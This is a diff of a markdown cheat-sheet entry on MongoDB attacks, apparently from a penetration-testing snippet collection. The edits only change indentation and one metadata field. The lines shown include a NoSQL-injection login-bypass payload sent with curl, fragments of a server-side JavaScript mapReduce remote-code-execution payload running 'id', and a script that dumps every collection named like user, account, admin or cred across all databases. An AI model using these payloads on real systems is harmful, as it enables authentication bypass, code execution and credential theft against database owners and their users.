@@ -3,7 +3,7 @@ id: "tnyfczxoemptl7mvv"
 title: "mongodb"
 description: ""
 tags: []
-order: "13"
+order: 13
 createdAt: "2026-05-31T09:38:35.803Z"
 updatedAt: "2026-05-31T09:38:47.951Z"
 ---
@@ -227,7 +227,7 @@ db.getCollectionNames().forEach(function(c){
 
 ### igjw2mmzymptl7vxk
 ```bash
-var doc = db[c].findOne();
+  var doc = db[c].findOne();
 ```
 
 **Tags:** mongodb, enumeration, datadump
@@ -235,7 +235,7 @@ var doc = db[c].findOne();
 
 ### 487m80e9mmptl7vxp
 ```bash
-if(doc) printjson(Object.keys(doc));
+  if(doc) printjson(Object.keys(doc));
 ```
 
 **Tags:** mongodb, enumeration, datadump
@@ -320,7 +320,7 @@ curl -s -X POST $URL/login -H "Content-Type: application/json" \
 
 ### 1zkgwpd01mptl7vzo
 ```bash
--d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
 ```
 
 **Tags:** mongodb, nosqli, injection, exploitation, bypass
@@ -455,7 +455,7 @@ _RCE via Server-Side JS_
 
 ### svoe1mv4jmptl7w2p
 ```bash
-function() { emit(0, run("id")); },
+  function() { emit(0, run("id")); },
 ```
 
 **Tags:** mongodb, rce, ssjs, exploitation
@@ -463,7 +463,7 @@ function() { emit(0, run("id")); },
 
 ### v7inph5stmptl7w2u
 ```bash
-function(k, v) { return v; },
+  function(k, v) { return v; },
 ```
 
 **Tags:** mongodb, rce, ssjs, exploitation
@@ -471,7 +471,7 @@ function(k, v) { return v; },
 
 ### gxyvzwus4mptl7w2z
 ```bash
-{out: {inline: 1}}
+  {out: {inline: 1}}
 ```
 
 **Tags:** mongodb, rce, ssjs, exploitation
@@ -540,7 +540,7 @@ db.adminCommand({listDatabases:1}).databases.forEach(function(d){
 
 ### 5bp3qjj7wmptl7w4i
 ```bash
-var mydb = db.getSiblingDB(d.name);
+  var mydb = db.getSiblingDB(d.name);
 ```
 
 **Tags:** mongodb, credentials, datadump
@@ -548,7 +548,7 @@ var mydb = db.getSiblingDB(d.name);
 
 ### p8a0nwo19mptl7w4m
 ```bash
-mydb.getCollectionNames().forEach(function(c){
+  mydb.getCollectionNames().forEach(function(c){
 ```
 
 **Tags:** mongodb, credentials, datadump
@@ -556,7 +556,7 @@ mydb.getCollectionNames().forEach(function(c){
 
 ### 6n32z44zqmptl7w4r
 ```bash
-if(c.match(/user|account|admin|cred/i)){
+    if(c.match(/user|account|admin|cred/i)){
 ```
 
 **Tags:** mongodb, credentials, datadump
@@ -564,7 +564,7 @@ if(c.match(/user|account|admin|cred/i)){
 
 ### jy26c4wnjmptl7w4w
 ```bash
-print("=== " + d.name + "." + c + " ===");
+      print("=== " + d.name + "." + c + " ===");
 ```
 
 **Tags:** mongodb, credentials, datadump
@@ -572,7 +572,7 @@ print("=== " + d.name + "." + c + " ===");
 
 ### w4c9adj30mptl7w52
 ```bash
-mydb[c].find().forEach(printjson);
+      mydb[c].find().forEach(printjson);
 ```
 
 **Tags:** mongodb, credentials, datadump
@@ -580,7 +580,7 @@ mydb[c].find().forEach(printjson);
 
 ### yx1cnbj09mptl7w57
 ```bash
-}
+    }
 ```
 
 **Tags:** mongodb, credentials, datadump
@@ -588,7 +588,7 @@ mydb[c].find().forEach(printjson);
 
 ### yip2gvog3mptl7w5c
 ```bash
-});
+  });
 ```
 
 **Tags:** mongodb, credentials, datadump
